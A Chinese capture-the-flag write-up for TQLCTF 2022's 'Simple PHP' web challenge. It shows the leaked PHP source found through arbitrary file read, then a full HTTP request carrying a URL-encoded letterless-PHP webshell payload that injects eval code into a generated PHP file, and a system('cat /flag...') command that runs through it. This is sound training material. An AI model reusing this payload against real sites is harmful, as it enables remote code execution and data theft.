# 2022-TQLCTF-Web-Writeup

## Simple PHP

注册登录后f12发现有个`path="../get_pic.php?image=img/haokangde.png"`，任意文件读取把环境源码下载下来：

```php
<?php
error_reporting(0);
if(isset($_POST['user']) && isset($_POST['pass'])){
    $hash_user = md5($_POST['user']);
    $hash_pass = 'zsf'.md5($_POST['pass']);
    if(isset($_POST['punctuation'])){
        //filter
        if (strlen($_POST['user']) > 6){
            echo("<script>alert('Username is too long!');</script>");
        }
        elseif(strlen($_POST['website']) > 25){
            echo("<script>alert('Website is too long!');</script>");
        }
        elseif(strlen($_POST['punctuation']) > 1000){
            echo("<script>alert('Punctuation is too long!');</script>");
        }
        else{
            if(preg_match('/[^\w\/\(\)\*<>]/', $_POST['user']) === 0){
                if (preg_match('/[^\w\/\*:\.\;\(\)\n<>]/', $_POST['website']) === 0){
                    $_POST['punctuation'] = preg_replace("/[a-z,A-Z,0-9>\?]/","",$_POST['punctuation']);
                    $template = file_get_contents('./template.html');
                    $content = str_replace("__USER__", $_POST['user'], $template);
                    $content = str_replace("__PASS__", $hash_pass, $content);
                    $content = str_replace("__WEBSITE__", $_POST['website'], $content);
                    $content = str_replace("__PUNC__", $_POST['punctuation'], $content);
                    file_put_contents('tttest.php', $content);
                    echo("<script>alert('Successed!');</script>");
                }
                else{
                    echo("<script>alert('Invalid chars in website!');</script>");
                }
            }
            else{
                echo("<script>alert('Invalid chars in username!');</script>");
            }
        }
    }
    else{
        setcookie("user", $_POST['user'], time()+3600);
        setcookie("pass", $hash_pass, time()+3600);
        Header("Location:sandbox/$hash_user.php");
    }
}
?>
```

想办法写马了，比较简单就是无数字字母rce：

```http
POST /index.php HTTP/1.1
Host: 120.77.216.55:25104
Content-Length: 2229
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://120.77.216.55:25104
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://120.77.216.55:25104/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: pass=zsfc4ca4238a0b923820dcc509a6f75849b; user=1
Connection: close

user=1)/*&pass=1&website=*/;eval(__PUNC__);/*&punctuation='%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B"!"%3D%3D"%40"%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D"_"%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B'
```

```
http://120.77.216.55:25104/sandbox/167d74fbbfccd26d2e5e09e97c9294a3.php

_=system("cat /flag-8415d97b-0e26-4569-ac42-5f6ef6fd58fb");
```

